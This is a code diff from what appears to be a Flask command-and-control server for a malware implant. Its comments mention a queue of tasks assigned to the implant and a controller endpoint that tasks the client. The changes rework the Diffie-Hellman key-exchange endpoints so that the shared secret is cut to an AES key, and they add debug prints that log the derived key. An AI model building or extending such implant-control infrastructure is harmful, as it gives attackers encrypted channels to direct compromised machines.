@@ -18,9 +18,6 @@ command_menu = {
 }
 
 
-# global_key = int("ffffffffffffffffffffffffffffffff", 16).to_bytes(16, "big")
-
-
 # Queue of tasks assigned to the implant
 tasks = Queue()
 
@@ -56,15 +53,21 @@ def menu():
 
 @app.route('/getkey', methods=['GET'])
 def get_public_key():
+    #print(f"[+] Server public key: {dh1_public}")
     return jsonify({"key": dh1_public.decode('latin-1')})
 
 
 @app.route('/sendkey', methods=['POST'])
 def send_public_key():
     global shared_key
-    res = request.get_json()["key"]
-    shared_key = dh1.generate_shared_key(res.encode('latin-1'))
-    print(shared_key)
+    print("in endpoint")
+    res = request.get_json()
+    #print(res)
+    res = res["key"]
+    #print(f"[+] client public key: {res.encode('latin-1')}")
+    shared_key = dh1.generate_shared_key(res.encode('latin-1'))[:16]
+    print(f"[+] Derived AES key: {shared_key}")
+    return jsonify({"Success": "Yay"}), 200
 
 # A controller can invoke this endpoint to task the client
 @app.route('/assign/<int:cmd_index>', methods=['POST'])
